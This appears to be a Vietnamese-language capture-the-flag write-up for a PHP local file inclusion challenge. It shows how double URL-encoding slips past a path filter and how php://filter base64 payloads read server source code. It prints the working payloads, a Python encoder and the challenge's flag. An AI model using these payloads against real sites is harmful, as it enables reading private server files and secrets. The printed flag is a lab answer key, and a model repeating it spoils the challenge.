# Local File Inclusion - Double encoding

**30 Points**  

Include can be dangerous.

**Statement**
Find the validation password in the source files of the website.

## Analysis:

Xác định source (nơi ta có thể chèn input) là tại tham số `page` của URL. Thử payload `../` thì bị báo **"Attack detected."**. Thử chuyển qua URL-encoding thành `%2e` (.) và `%2f` (/) cũng bị detected nốt. Bộ lọc bên server là:

Filter: `.` `/` `%2f` `%2e`

Tên bài là "Double encoding" cho ta gợi ý nên bypass filter bằng cách _Double-encode_ payload. Ví dụ như hồi nãy bị filter `%2e` thì mình sẽ Url-encode dấu `%` thành `%25` (%). Vậy ta có `%252e` sẽ là dấu `.`. Thử payload:

```
%252e
```

![image](https://user-images.githubusercontent.com/48288606/163758956-25024a41-a5d4-414d-ade6-ffd390e827ab.png)

Vậy là ta đã chèn payload vào thành công, chỉ vướng lỗi logic (ta sẽ xác định sau). Mình viết một snippet python nho nhỏ để tạo double-encoding:

```python
string = "../" # This string would be double-encoded.
payload = ""
filter = ['.','/']

for c in string:
    if c in filter:
        payload += "%25" + hex(ord(c))[2:]
    else:
        payload += c

print(payload)
```

Bây giờ mình sẽ thử payload `../` và phân tích. Double-encoded payload: `%252e%252e%252f`. 

![image](https://user-images.githubusercontent.com/48288606/163759491-500a5786-9ff0-4fc7-b2af-18c18f22e5f9.png)

Bên server dùng hàm [include()](https://www.php.net/manual/en/function.include.php) để lấy file, hàm này được xem là một hàm rủi ro nếu không có thao tác xử lý dữ liệu truyền vào như parameter `page`. Ngoài ra, đường dẫn mà chúng ta yêu cầu tài nguyên `../.inc.php` bị ra khỏi vùng cho phép `/tmp`. Đồng thời ta nhận ra chuỗi của chúng ta được concat với `.inc.php`. Vậy bình thường ta để giá trị `contact` thì file được truy vấn sẽ là `contact.inc.php`

Với việc không liệt kê file trong kết quả trả về, ta không thể dò tìm file ta mong muốn. Đối với dạng LFI có một kỹ thuật là [PHP wrapper](https://www.php.net/manual/en/wrappers.php). Wrappers là một code bổ sung cho một stream để xử lý các giao thức / mã hóa cụ thể. Ví dụ: wrappers `http` biết cách dịch một URL thành một **HTTP** request cho một file trên máy chủ từ xa. Khi làm việc với wrapper vì luồng stream được xử lý và được read ra nên ouput sẽ là nội dung của một file nào đó (do mình tùy chọn). Tham khảo [thêm](https://www.php.net/manual/en/intro.stream.php#:~:text=Introduction%20%C2%B6&text=A%20wrapper%20is%20additional%20code,file%20on%20a%20remote%20server.)

Áp dụng kỹ thuật này vào payload. Sử dụng `php://filter/resource=contact` với trang **contact**. Payload: 

```
php:%252f%252ffilter%252fconvert%252ebase64-encode%252fresource=contact
```

Output mã nguồn của file của chúng sẽ bị mã hóa base64 vì chúng ta chọn [Conversion Filters](https://www.php.net/manual/en/filters.convert.php) là `convert.base64-encode` (tương đương với đưa toàn bộ stream content qua hàm **base64_encode()**) 

![image](https://user-images.githubusercontent.com/48288606/163790457-3b104c42-b13c-4c49-9e2f-2a2361f9f33d.png)

Decode base64 bằng lệnh `base64 -d` (Linux):

```
echo "<string-to-be-decoded>" | base64 -d 
```

Chúng ta có source code PHP:

```php
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Contact</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact" class="active">Contact</a>
    </nav>
    <div id="main">
      <h2>Contact</h2>
      <p>If you got to talk to me, don't hesitate to send me an email <a href="mailto:<?= $conf['contact']['mail'] ?>">here</a>.</p>
      <p>You can also phone me on this number : <?= $conf['contact']['phone'] ?></p>
    </div>
  </body>
</html>
```

Vậy chúng ta chỉ có thể đọc file đã biết tên và đường dẫn cụ thể. Theo codebase ở trên thì ta thấy có file `conf.inc.php`. Vào đây check nội dung file, dùng `php://filter/convert.base64-encode/resource=conf`. Payload:

```
php:%252f%252ffilter%252fconvert%252ebase64-encode%252fresource=conf
```

![image](https://user-images.githubusercontent.com/48288606/163792362-b86c7732-89f5-46e8-a489-a056fe9346ed.png)

Decode tương tự bằng `base64` command:

```php
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];
```

Ta có được flag trong source code.



Flag: **Th1sIsTh3Fl4g!**
